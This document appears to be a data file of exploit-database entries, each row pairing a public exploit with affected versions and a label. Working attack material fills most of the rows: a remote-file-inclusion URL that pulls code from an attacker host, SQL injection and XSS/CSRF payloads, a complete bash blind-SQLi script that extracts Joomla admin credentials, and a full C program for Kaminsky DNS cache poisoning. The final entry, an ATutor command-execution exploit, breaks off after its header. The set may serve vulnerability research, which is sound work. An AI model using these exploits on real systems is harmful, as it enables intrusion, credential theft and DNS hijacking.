2924,"mxBB Module kb_mods 2.0.2 - Remote File Inclusion _____         __  __             __      ___ |  __ \       |  \/  |            \ \    / (_) | |  | |_ __  | \  / | __ ___  __  \ \  / / _ _ __ _   _ ___ | |  | | '__| | |\/| |/ _` \ \/ /   \ \/ / | | '__| | | / __| | |__| | |    | |  | | (_| |>  <     \  /  | | |  | |_| \__ \ |_____/|_|    |_|  |_|\__,_/_/\_\     \/   |_|_|   \__,_|___/  =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-==-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=                         Knowledgebase kb_mods  Multiple Remote Vulnerablities                             Remote File Inclusion & Local File Inclusion =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-==-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-= Script:knowledgebase Version:2.0.2 Download:http://www.mx-system.com/modules/mx_pafiledb/dload.php?action=download&file_id=55 =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-==-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-= Author:Dr Max Virus Location:Egypt =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-==-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-= Bug in :includes/common.php Vul Code:  =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-==-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-= Problem:The variable of phpEx & many variables are not sanitized =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-==-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-= POC: http://[target]/mxBB/modules/kb_mods/includes/kb_constants.php?module_root_path=Evil Code http://[target]/mxBB/modules/kb_mods/includes/kb_constants.php?kb_constants.php&board_config[default_lang]=english&phpEx=../../.. /../../etc/passwd =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-==-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-= Thx to:str0ke & All My Friends Special Gr33ts:AsianEagle & The Master & Kacper & HotTurk =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-==-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=  # milw0rm.com [2006-12-12]",['2.0.2'],1
33773,"tenfourzero.net Shutter 0.1.4 - 'admin.html' Multiple SQL Injections source: https://www.securityfocus.com/bid/38849/info  tenfourzero.net's Shutter is prone to multiple SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  Shutter 0.1.4 is vulnerable; other versions may also be affected.   http://www.example.com/shutter/admin.html?albumID=2%20and%20substring%28@@version,1,1%29=5 http://www.example.com/shutter/admin.html?albumID=2&photoID=5%20and%20substring%28@@version,1,1%29=5",['0.1.4'],1
1814,"UBBCentral UBB.Threads 6.4.x < 6.5.2 - 'thispath' Remote File Inclusion Anomaly 1n The System presents UBB.threads >= 6.4.x Remote File Inclusion   founded by V4mu in 04/20/2006  URL: http://www.ubbcentral.com Google dork: allinurl:""/ubbthreads/""  exploit: /addpost_newpoll.php?addpoll=preview&thispath=http://[attacker]/cmd.gif?&cmd=id   contact: irc.gigachat.net #A1TS  # milw0rm.com [2006-05-22]","['6.4.x < 6.5.2', '6.4.x']",1
39559,"TeamPass 2.1.24 - Multiple Vulnerabilities Affected Product:    TeamPass Vulnerability Type:  	Multiple XSS,CSRF, SQL injections Fixed in Version:	2.1.25 (https://github.com/nilsteampassnet/TeamPass/releases/tag/2.1.25.0) Vendor Website:      	http://www.teampass.net Software Link: : 	https://github.com/nilsteampassnet/TeamPass Affected Version:	2.1.24 and prior  Vulnerable software (including source) : https://github.com/nilsteampassnet/TeamPass/releases/tag/2.1.24.4 Google Dork: intitle:""Teampass"" + inurl:index.php?page=items Tested on: Ubuntu Remote Exploitable:  Yes Reported to vendor:  30 december 2015 Disclosed to public: 14 March 2016 Release mode:        Responsible Disclosure CVE-2015-7562 TeamPass 2.1.24 Persistant XSS  CVE-2015-7563 TeamPass 2.1.24 CSRF  CVE-2015-7564 TeamPass 2.1.24 SQL Injection  Credits:              Vincent Malguy   Description : TeamPass is a Passwords Manager dedicated for managing passwords in a collaborative way on any server Apache, MySQL and PHP. It is especially designed to provide passwords access security for allowed people. This makes TeamPass really useful in a Business/Enterprise environment and will provide to IT or Team Manager a powerful and easy tool for customizing passwords access depending on the user’s role.  Copyright (c) 2009-2015, Nils Laumaillé  ********************* CVE-2015-7562 TeamPass 2.1.24 Persistant XSS  ********************* When displaying the detail of an item (a password entry), the ""label"" value is display using the stripslashes() sanitization function. This function does not efficiently  prevent XSS. POC of a persistant XSS : add  item with label : $str = ""' onclick='javascript:alert(""XSS found"");' alt='"";echo ""<a href='"". strip_tags($str) .""'></a>""; This xss will be trigger each time a user click on this item.  As item can be share, there is a way for a user to trick an admin to trigger this xss. fix in commit cd112ea (see https://github.com/nilsteampassnet/TeamPass/pull/1140)  POC of a persistant XSS :  Add a new role with name  : <script>alert(""XSS"");</script>  This xss will be trigger in many admin pages Fix in commit : 3f0a6c9 & e29cd54 & 295cada & 2c8a829 (see https://github.com/nilsteampassnet/TeamPass/pull/1140)  ********************* CVE-2015-7563 TeamPass 2.1.24 CSRF  ********************* Lack of anti-CSRF token lead to security vulnerabilities where an attacker can trick a authenticated user to do some unwanted action on his behalf :  <form action=""http://<teampass host>/sources/main.queries.php"" method=""post"">     <select name=""type"">     <option value=""increase_session_time »>will add 1 hour timeout to the user session</option> </select>     <input type=submit>   </form>     recommanded fix: add anti-CSRF token.  ********************* CVE-2015-7564 TeamPass 2.1.24 SQL Injections   ********************* SQL injection has been found in item.query.php parameter id with type set to action_on_quick_icon. Sqlmap output  : --- Parameter: id (POST) Type: boolean-based blind Title: MySQL >= 5.0 boolean-based blind - Parameter replace Payload: type=action_on_quick_icon&id=(SELECT (CASE WHEN (6144=6144) THEN 6144 ELSE 6144*(SELECT 6144 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))&action=1  —  fix in commit 795256f (see https://github.com/nilsteampassnet/TeamPass/pull/1140)   SQL injections has been found in view.query.php in parameters order and direction with type set to connections_logs, errors_logs or access_logs . Note that direction need to be prefixed by "", ""  in order to be exploitable Sqlmap output  for connections_logs: --- Parameter: order (POST)     Type: boolean-based blind     Title: MySQL >= 5.0 boolean-based blind - Parameter replace     Payload: type=connections_logs&order=(SELECT (CASE WHEN (6688=6688) THEN 6688 ELSE 6688*(SELECT 6688 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))&direction=DESC      Type: AND/OR time-based blind     Title: MySQL >= 5.0.12 AND time-based blind (SELECT)     Payload: type=connections_logs&order=date AND (SELECT * FROM (SELECT(SLEEP(5)))vhPw)&direction=DESC —  --- Parameter: direction (POST)    Type: boolean-based blind    Title: MySQL >= 5.0 boolean-based blind - Parameter replace    Payload: type=errors_logs&order=date&direction=,  (SELECT (CASE WHEN (1739=1739) THEN 1739 ELSE 1739*(SELECT 1739 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END)) — fix commit 86719e0 (see https://github.com/nilsteampassnet/TeamPass/pull/1140)",['2.1.24'],1
33249,"Collabtive 1.2 - SQL Injection Vulnerability title: SQL Injection / SQL Error message in Collabtive application (CVE-2014-3246) CVE: CVE-2014-3246 (cordinated with Vendor: Collabtive Product: Collabtive (Open Source Project Management Software) Affected version: 1.12 Fixed version: 2.0 Reported by: Deepak Rathore Severity: Critical URL: http://[domain]/collabtive-12/managefile.php?action=showproject&id=2482 Affected Users: Authenticated users Affected parameter(s): folder  Issue details: The folder parameter appears to be vulnerable to SQL injection attacks. The payload 1%3d was submitted in the folder parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.  The database appears to be MySQL.  HTTP request: GET /manageajax.php?action=fileview_list&id=2482&folder=1%3d HTTP/1.1 Host: collabtive.o-dyn.de User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0 Accept: text/javascript, text/html, application/xml, text/xml, */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate X-Requested-With: XMLHttpRequest X-Prototype-Version: 1.6.0.3 Referer: http://xxx/managefile.php?action=showproject&id=2482 Cookie: PHPSESSID=ba83d29aab270a7926ea1be2e1f830be; PHPSESSID=ba83d29aab270a7926ea1be2e1f830be Connection: keep-alive  Steps to replicate: 1. Login into application 2. Go to ""Desktop"" tab and click on ""Add project"" 3. Fill the project details in the project form and click on ""Add"" button 4. After creating a project go to ""Files"" tab and Intercept the request 5. At ""manageajax.php"" file, replace ""folder"" parameter value with ""1%3d"" ===================== Original Request ===================== GET /manageajax.php?action=fileview_list&id=2482&folder=0 HTTP/1.1 Host: collabtive.o-dyn.de User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0 Accept: text/javascript, text/html, application/xml, text/xml, */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate X-Requested-With: XMLHttpRequest X-Prototype-Version: 1.6.0.3 Referer: http://xxx/managefile.php?action=showproject&id=2482 Cookie: PHPSESSID=ba83d29aab270a7926ea1be2e1f830be; PHPSESSID=ba83d29aab270a7926ea1be2e1f830be Connection: keep-alive ====================== Attack Request ====================== GET /manageajax.php?action=fileview_list&id=2482&folder=1%3d HTTP/1.1 Host: collabtive.o-dyn.de User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0 Accept: text/javascript, text/html, application/xml, text/xml, */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate X-Requested-With: XMLHttpRequest X-Prototype-Version: 1.6.0.3 Referer: http://xxx/managefile.php?action=showproject&id=2482 Cookie: PHPSESSID=ba83d29aab270a7926ea1be2e1f830be; PHPSESSID=ba83d29aab270a7926ea1be2e1f830be Connection: keep-alive ====================== 6. Forward manipulated request to server and wait for response in browser 7. SQL Error message is the proof of vulnerability.  Tools used: Burp Suite proxy, Mozilla Firefox browser",['1.2'],1
17050,"Family Connections CMS 2.3.2 - Persistent Cross-Site Scripting / XML Injection <!--   Family Connections CMS 2.3.2 (POST) Stored XSS And XML Injection   Vendor: Ryan Haudenschilt Product web page: http://www.familycms.com Affected version: 2.3.2  Summary: Family Connections is an open source content management system. It makes creating a private, family website easy and fun.  Desc: FCMS suffers from a stored XSS vulnerability (post-auth) in messageboard.php script thru the 'subject' post parameter. XML Inj. lies in the /inc/getChat.php script with 'users' get parameter with no args, and post parameter 'message'.  Tested on: Microsoft Windows XP Professional SP3 (EN)            Apache 2.2.14 (Win32)            PHP 5.3.1            MySQL 5.1.41  Vulnerability discovered by Gjoko 'LiquidWorm' Krstic                             liquidworm gmail com                             Zero Science Lab - http://www.zeroscience.mk   Advisory ID: ZSL-2011-5004 Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5004.php   22.03.2011   -->    <html> <title>Family Connections CMS 2.3.2 Stored XSS And XPath Injection</title> <body bgcolor=""#1C1C1C""> <script type=""text/javascript""> function xpath(){document.forms[""xml""].submit();} function xss(){document.forms[""xss""].submit();} </script> <form action=""http://FCMS/inc/getChat.php"" enctype=""application/x-www-form-urlencoded"" method=""POST"" id=""xml""> <input type=""hidden"" name=""message"" value=""\\';--\\"";--"" /></form> <a href=""javascript: xml();"" style=""text-decoration:none""> <b><font color=""red""><center><h3><br /><br />Exploit XML Injection!<h3></center></font></b></a> <form action=""http://FCMS/messageboard.php"" enctype=""application/x-www-form-urlencoded"" method=""POST"" id=""xss""> <input type=""hidden"" name=""subject"" value='""><script>alert(1)</script>' /> <input type=""hidden"" name=""post"" value=""waddup"" /> <input type=""hidden"" name=""name"" value=""1"" /> <input type=""hidden"" name=""post_submit"" value=""Submit"" /></form> <a href=""javascript: xss();"" style=""text-decoration:none""> <b><font color=""red""><center><h3><br /><br />Exploit XSS!<h3></center></font></b></a> </body></html>",['2.3.2'],1
14911,"Joomla! Component Gantry 3.0.10 - Blind SQL Injection #!/bin/bash # Exploit Title: Gantry Framework 3.0.10 (Joomla) Blind SQL Injection  Exploit # Date: 4 September 2010 # Author: jdc # Software Link: http://www.gantry-framework.org # Version: 3.0.10 # Patched: 3.0.11 if [ ""$1"" == """" ] then      echo ""$0 usage: $0 url [debug]""      echo """"      exit 1 fi clear echo ""##############################################################"" echo ""##   Gantry Framework 3.0.10 Blind SQL Injection Exploit    ##"" echo ""##############################################################"" echo """" echo ""   Probing target $1 ..."" echo """" GANTRY_PATH=""$1/index.php"" GANTRY_TIMEOUT=""5"" GANTRY_DELAY=""10"" GANTRY_AGENT='Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)' GANTRY_DATA=""option=com_gantry&tmpl=gantry-ajax&model=module&moduleid="" GANTRY_BENCHMARK=""10000000"" GANTRY_ADMIN_ID="""" GANTRY_OUTPUT="""" GANTRY_EXPLOIT=""-1%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16"" GANTRY_TEST=`curl -s -A ""$GANTRY_AGENT"" -d ""$GANTRY_DATA$GANTRY_EXPLOIT""  ""$GANTRY_PATH""` GANTRY_REQUESTS=""1"" if [ ""Direct access not allowed."" != ""$GANTRY_TEST"" ] then      echo $GANTRY_TEST      echo ""!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!""      echo ""!! Site not vulnerable. Bailing! !!""      echo ""!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!""      echo """"      echo ""$GANTRY_REQUESTS requests""      echo """"      exit 1 fi echo -n ""   Trying to get a super admin id... "" for N in `seq 62 9999` do        GANTRY_EXPLOIT=""-1%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,IF((SELECT%20id%20FROM%20%23__users%20WHERE%20gid=25%20AND%20id=$N),BENCHMARK($GANTRY_BENCHMARK,MD5(1)),16)""      GANTRY_TIME=""`curl -s -A ""$GANTRY_AGENT"" -o /dev/null -w  '%{time_total}' -H 'X-Requested-With: XMLHttpRequest' -d  ""$GANTRY_DATA$GANTRY_EXPLOIT"" $GANTRY_PATH`""      GANTRY_REQUESTS=`echo ""$GANTRY_REQUESTS + 1"" | bc`      if [ """" != ""$2"" ]      then          printf ""$N""          echo ""  $GANTRY_TIME""      fi      if [ `echo ""$GANTRY_TIME > $GANTRY_TIMEOUT"" | bc` == 1 ]      then          GANTRY_ADMIN_ID=""$N""          break      fi      sleep $GANTRY_DELAY done if [ """" == $GANTRY_ADMIN_ID ] then      echo ""FAILED!""      echo """"      echo ""!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!""      echo ""!!       Injection FAILED!       !!""      echo ""!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!""      echo """"      echo ""$GANTRY_REQUESTS requests""      echo """"      exit 1 fi echo $GANTRY_ADMIN_ID echo ""   Fetching admin info (this WILL take a while)... "" echo """" echo -n "" > "" for I in `seq 1 250` do      GANTRY_LENGTH=`echo ""$GANTRY_OUTPUT"" | wc -c`      GANTRY_CONTINUE=0      #a,d,m,i,n,b-c,e-h,j-l,o-z,A-Z,0-9,special chars      for J in `seq 97 97;seq 100 100;seq 109 109;seq 105 105;seq 110  110;seq 98 99;seq 101 104;seq 106 108;seq 111 122;seq 65 90;seq 48  57;seq 32 47;seq 58 64;seq 91 96;seq 123 126`      do          if [ 1 == $GANTRY_CONTINUE ]          then              continue          fi          sleep $GANTRY_DELAY            GANTRY_EXPLOIT=""-1%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,IF((SELECT%20id%20FROM%20%23__users%20WHERE%20gid=25%20AND%20id=$GANTRY_ADMIN_ID%20AND%20ASCII(SUBSTRING(CONCAT(username,0x3a,email,0x3a,password),$I,1))=$J),BENCHMARK(10000000,MD5(1)),16)""          GANTRY_TIME=""`curl -s -A ""$GANTRY_AGENT"" -o /dev/null -w  '%{time_total}' -H 'X-Requested-With: XMLHttpRequest' -d  ""$GANTRY_DATA$GANTRY_EXPLOIT"" $GANTRY_PATH`""          GANTRY_REQUESTS=`echo ""$GANTRY_REQUESTS + 1"" | bc`          if [ """" != ""$2"" ]          then              printf ""\x$(printf %x $J)""              echo ""  $GANTRY_TIME""          fi          if [ `echo ""$GANTRY_TIME > $GANTRY_TIMEOUT"" | bc` == 1 ]          then              LETTER=`printf ""\x$(printf %x $J)""`              GANTRY_OUTPUT=""$GANTRY_OUTPUT$LETTER""              GANTRY_CONTINUE=1              if [ """" == ""$2"" ]              then                  echo -n ""$LETTER""              fi          fi      done      GANTRY_LENGTH2=`echo ""$GANTRY_OUTPUT"" | wc -c`      if [ ""$GANTRY_LENGTH"" == ""$GANTRY_LENGTH2"" ]      then          break      fi done echo """" if [ ""$GANTRY_OUTPUT"" == """" ] then      echo ""!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!""      echo ""!!       Injection FAILED!       !!""      echo ""!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!""      echo """"      echo ""$GANTRY_REQUESTS requests""      echo """"      exit 1 fi echo """" echo ""$GANTRY_OUTPUT"" echo """" echo ""$GANTRY_REQUESTS requests"" echo """" exit 0",['3.0.10'],1
6130,"BIND 9.x - Remote DNS Cache Poisoning /*  * Exploit for CVE-2008-1447 - Kaminsky DNS Cache Poisoning Attack  *  * Compilation:  * $ gcc -o kaminsky-attack kaminsky-attack.c `dnet-config --libs` -lm  *  * Dependency: libdnet (aka libdumbnet-dev under Ubuntu)  *  * Author: marc.bevand at rapid7 dot com  */  #define _BSD_SOURCE  #include <sys/types.h> #include <err.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <math.h> #include <time.h> #include <unistd.h> #include <dumbnet.h>  #define DNSF_RESPONSE      (1<<15) #define DNSF_AUTHORITATIVE (1<<10) #define DNSF_REC_DESIRED   (1<<8) #define DNSF_REC_AVAILABLE (1<<7)  #define TYPE_A       0x1 #define TYPE_NS      0x2 #define CLASS_IN     0x1  struct dns_pkt {    uint16_t txid;    uint16_t flags;    uint16_t nr_quest;    uint16_t nr_ans;    uint16_t nr_auth;    uint16_t nr_add; } __attribute__ ((__packed__));  void format_domain(u_char *buf, unsigned size, unsigned *len, const char *name) {    unsigned bufi, i, j;    bufi = i = j = 0;    while (name[i])    {       if (name[i] == '.')       {          if (bufi + 1 + (i - j) > size)             fprintf(stderr, ""format_domain overflow\n""), exit(1);          buf[bufi++] = i - j;          memcpy(buf + bufi, name + j, i - j);          bufi += i - j;          j = i + 1;       }       i++;    }    if (bufi + 1 + 2 + 2 > size)       fprintf(stderr, ""format_domain overflow\n""), exit(1);    buf[bufi++] = 0;    *len = bufi; }  void format_qr(u_char *buf, unsigned size, unsigned *len, const char *name, uint16_t type, uint16_t class) {    uint16_t tmp;    // name    format_domain(buf, size, len, name);    // type    tmp = htons(type);    memcpy(buf + *len, &tmp, sizeof (tmp));    *len += sizeof (tmp);    // class    tmp = htons(class);    memcpy(buf + *len, &tmp, sizeof (tmp));    *len += sizeof (tmp); }  void format_rr(u_char *buf, unsigned size, unsigned *len, const char *name, uint16_t type, uint16_t class, uint32_t ttl, const char *data) {    format_qr(buf, size, len, name, type, class);    // ttl    ttl = htonl(ttl);    memcpy(buf + *len, &ttl, sizeof (ttl));    *len += sizeof (ttl);    // data length + data    uint16_t dlen;    struct addr addr;    switch (type)    {       case TYPE_A:          dlen = sizeof (addr.addr_ip);          break;       case TYPE_NS:          dlen = strlen(data) + 1;          break;       default:          fprintf(stderr, ""format_rr: unknown type %02x"", type);          exit(1);    }    dlen = htons(dlen);    memcpy(buf + *len, &dlen, sizeof (dlen));    *len += sizeof (dlen);    // data    unsigned len2;    switch (type)    {       case TYPE_A:          if (addr_aton(data, &addr) < 0)             fprintf(stderr, ""invalid destination IP: %s"", data), exit(1);          memcpy(buf + *len, &addr.addr_ip, sizeof (addr.addr_ip));          *len += sizeof (addr.addr_ip);          break;       case TYPE_NS:          format_domain(buf + *len, size - *len, &len2, data);          *len += len2;          break;       default:          fprintf(stderr, ""format_rr: unknown type %02x"", type);          exit(1);    } }  void dns_query(u_char *buf, unsigned size, unsigned *len, uint16_t txid, uint16_t flags, const char *name) {    u_char *out = buf;    struct dns_pkt p = {       .txid = htons(txid),       .flags = htons(flags),       .nr_quest = htons(1),       .nr_ans = htons(0),       .nr_auth = htons(0),       .nr_add = htons(0),    };    u_char qr[256];    unsigned l;    format_qr(qr, sizeof (qr), &l, name, TYPE_A, CLASS_IN);    if (sizeof (p) + l > size)       fprintf(stderr, ""dns_query overflow""), exit(1);    memcpy(out, &p, sizeof (p));    out += sizeof (p);    memcpy(out, qr, l);    out += l;    *len = sizeof (p) + l; }  void dns_response(u_char *buf, unsigned size, unsigned *len,       uint16_t txid, uint16_t flags,       const char *q_name, const char *q_ip,       const char *domain, const char *auth_name, const char *auth_ip) {    u_char *out = buf;    u_char *end = buf + size;    u_char rec[256];    unsigned l_rec;    uint32_t ttl = 24*3600;    struct dns_pkt p = {       .txid = htons(txid),       .flags = htons(flags),       .nr_quest = htons(1),       .nr_ans = htons(1),       .nr_auth = htons(1),       .nr_add = htons(1),    };    (void)domain;    *len = 0;    if (out + *len + sizeof (p) > end)       fprintf(stderr, ""dns_response overflow""), exit(1);    memcpy(out + *len, &p, sizeof (p)); *len += sizeof (p);    // queries    format_qr(rec, sizeof (rec), &l_rec, q_name, TYPE_A, CLASS_IN);    if (out + *len + l_rec > end)       fprintf(stderr, ""dns_response overflow""), exit(1);    memcpy(out + *len, rec, l_rec); *len += l_rec;    // answers    format_rr(rec, sizeof (rec), &l_rec, q_name, TYPE_A, CLASS_IN,          ttl, q_ip);    if (out + *len + l_rec > end)       fprintf(stderr, ""dns_response overflow""), exit(1);    memcpy(out + *len, rec, l_rec); *len += l_rec;    // authoritative nameservers    format_rr(rec, sizeof (rec), &l_rec, domain, TYPE_NS, CLASS_IN,          ttl, auth_name);    if (out + *len + l_rec > end)       fprintf(stderr, ""dns_response overflow""), exit(1);    memcpy(out + *len, rec, l_rec); *len += l_rec;    // additional records    format_rr(rec, sizeof (rec), &l_rec, auth_name, TYPE_A, CLASS_IN,          ttl, auth_ip);    if (out + *len + l_rec > end)       fprintf(stderr, ""dns_response overflow""), exit(1);    memcpy(out + *len, rec, l_rec); *len += l_rec; }  unsigned build_query(u_char *buf, const char *srcip, const char *dstip, const char *name) {    unsigned len = 0;    // ip    struct ip_hdr *ip = (struct ip_hdr *)buf;    ip->ip_hl = 5;    ip->ip_v = 4;    ip->ip_tos = 0;    ip->ip_id = rand() & 0xffff;    ip->ip_off = 0;    ip->ip_ttl = IP_TTL_MAX;    ip->ip_p = 17; // udp    ip->ip_sum = 0;    struct addr addr;    if (addr_aton(srcip, &addr) < 0)       fprintf(stderr, ""invalid source IP: %s"", srcip), exit(1);    ip->ip_src = addr.addr_ip;    if (addr_aton(dstip, &addr) < 0)       fprintf(stderr, ""invalid destination IP: %s"", dstip), exit(1);    ip->ip_dst = addr.addr_ip;    // udp    struct udp_hdr *udp = (struct udp_hdr *)(buf + IP_HDR_LEN);    udp->uh_sport = htons(1234);    udp->uh_dport = htons(53);    // dns    dns_query(buf + IP_HDR_LEN + UDP_HDR_LEN,          (unsigned)(sizeof (buf) - (IP_HDR_LEN + UDP_HDR_LEN)), &len,          rand(), DNSF_REC_DESIRED, name);    // udp len    len += UDP_HDR_LEN;    udp->uh_ulen = htons(len);    // ip len & cksum    len += IP_HDR_LEN;    ip->ip_len = htons(len);    ip_checksum(buf, len);    return len; }  unsigned build_response(u_char *buf, const char *srcip, const char *dstip,       uint16_t port_resolver, uint16_t txid,       const char *q_name, const char *q_ip,       const char *domain, const char *auth_name, const char *auth_ip) {    unsigned len = 0;    // ip    struct ip_hdr *ip = (struct ip_hdr *)buf;    ip->ip_hl = 5;    ip->ip_v = 4;    ip->ip_tos = 0;    ip->ip_id = rand() & 0xffff;    ip->ip_off = 0;    ip->ip_ttl = IP_TTL_MAX;    ip->ip_p = 17; // udp    ip->ip_sum = 0;    struct addr addr;    if (addr_aton(srcip, &addr) < 0)       fprintf(stderr, ""invalid source IP: %s"", srcip), exit(1);    ip->ip_src = addr.addr_ip;    if (addr_aton(dstip, &addr) < 0)       fprintf(stderr, ""invalid destination IP: %s"", dstip), exit(1);    ip->ip_dst = addr.addr_ip;    // udp    struct udp_hdr *udp = (struct udp_hdr *)(buf + IP_HDR_LEN);    udp->uh_sport = htons(53);    udp->uh_dport = htons(port_resolver);    // dns    dns_response(buf + IP_HDR_LEN + UDP_HDR_LEN,          (unsigned)(sizeof (buf) - (IP_HDR_LEN + UDP_HDR_LEN)), &len,          txid, DNSF_RESPONSE | DNSF_AUTHORITATIVE,          q_name, q_ip, domain, auth_name, auth_ip);    // udp len    len += UDP_HDR_LEN;    udp->uh_ulen = htons(len);    // ip len & cksum    len += IP_HDR_LEN;    ip->ip_len = htons(len);    ip_checksum(buf, len);    return len; }  void usage(char *name) {    fprintf(stderr, ""Usage: %s <ip-querier> <ip-resolver> <ip-authoritative> ""          ""<port-resolver> <subhost> <domain> <any-ip> <attempts> <repl-per-attempt>\n""          ""  <ip-querier>       Source IP used when sending queries for random hostnames\n""          ""                     (typically your IP)\n""          ""  <ip-resolver>      Target DNS resolver to attack\n""          ""  <ip-authoritative> One of the authoritative DNS servers for <domain>\n""          ""  <port-resolver>    Source port used by the resolver when forwarding queries\n""          ""  <subhost>          Poison the cache with the A record <subhost>.<domain>\n""          ""  <domain>           Domain name, see <subhost>.\n""          ""  <any-ip>           IP of your choice to be associated to <subhost>.<domain>\n""          ""  <attempts>         Number of poisoning attemps, more attempts increase the\n""          ""                     chance of successful poisoning, but also the attack time\n""          ""  <repl-per-attempt> Number of spoofed replies to send per attempt, more replies\n""          ""                     increase the chance of successful poisoning but, but also\n""          ""                     the rate of packet loss\n""          ""Example:\n""          ""  $ %s q.q.q.q r.r.r.r a.a.a.a 1234 pwned example.com. 1.1.1.1 8192 16\n""          ""This should cause a pwned.example.com A record resolving to 1.1.1.1 to appear\n""          ""in r.r.r.r's cache. The chance of successfully poisoning the resolver with\n""          ""this example (8192 attempts and 16 replies/attempt) is 86%%\n""          ""(1-(1-16/65536)**8192). This example also requires a bandwidth of about\n""          ""2.6 Mbit/s (16 replies/attempt * ~200 bytes/reply * 100 attempts/sec *\n""          ""8 bits/byte) and takes about 80 secs to complete (8192 attempts /\n""          ""100 attempts/sec).\n"",          name, name); }  int main(int argc, char **argv) {    if (argc != 10)       usage(argv[0]), exit(1);    const char *querier = argv[1];    const char *ip_resolver = argv[2];    const char *ip_authoritative = argv[3];    uint16_t port_resolver = (uint16_t)strtoul(argv[4], NULL, 0);    const char *subhost = argv[5];    const char *domain = argv[6];    const char *anyip = argv[7];    uint16_t attempts = (uint16_t)strtoul(argv[8], NULL, 0);    uint16_t replies = (uint16_t)strtoul(argv[9], NULL, 0);    if (domain[strlen(domain) - 1 ] != '.')       fprintf(stderr, ""domain must end with dot(.): %s\n"", domain), exit(1);    printf(""Chance of success: 1-(1-%d/65536)**%d = %.2f\n"", replies, attempts, 1 - pow((1 - replies / 65536.), attempts));    srand(time(NULL));    int unique = rand() + (rand() << 16);    u_char buf[IP_LEN_MAX];    unsigned len;    char name[256];    char ns[256];    ip_t *iph;    if ((iph = ip_open()) == NULL)       err(1, ""ip_open"");    int cnt = 0;    while (cnt < attempts)    {       // send a query for a random hostname       snprintf(name, sizeof (name), ""%08x%08x.%s"", unique, cnt, domain);       len = build_query(buf, querier, ip_resolver, name);       if (ip_send(iph, buf, len) != len)          err(1, ""ip_send"");       // give the resolver enough time to forward the query and be in a state       // where it waits for answers; sleeping 10ms here limits the number of       // attempts to 100 per sec       usleep(10000);       // send spoofed replies, each reply contains:       // - 1 query: query for the ""random hostname""       // - 1 answer: ""random hostname"" A 1.1.1.1       // - 1 authoritative nameserver: <domain> NS <subhost>.<domain>       // - 1 additional record: <subhost>.<domain> A <any-ip>       snprintf(ns, sizeof (ns), ""%s.%s"", subhost, domain);       unsigned r;       for (r = 0; r < replies; r++)       {          // use a txid that is just 'r': 0..(replies-1)          len = build_response(buf, ip_authoritative, ip_resolver,                port_resolver, r, name, ""1.1.1.1"", domain, ns, anyip);          if (ip_send(iph, buf, len) != len)             err(1, ""ip_send"");       }       cnt++;    }    ip_close(iph);    return 0; }  // milw0rm.com [2008-07-25]",['9.x'],1
1298,"ATutor 1.5.1pl2 - SQL Injection / Command Execution <?php #   atutor_151pl2_xpl.php                             5.12 08/11/2005          # #                                                                              # #          Atutor 1.5.1 pl2 (possibly prior versions) SQL injection /          # #                   / remote commands execution                                # #                              by rgod                                         # #                  site: http://rgod.altervista.org                            # #                                                                              # #  usage: launch from Apache, fill in requested fields, then go!               # #                                                                              # #  make these changes in php.ini if you have troubles                          # #  with this script:                                                           # #  allow_call_time_pass_reference = on                                         # #  register_globals = on                                                       # #                                                                              # #  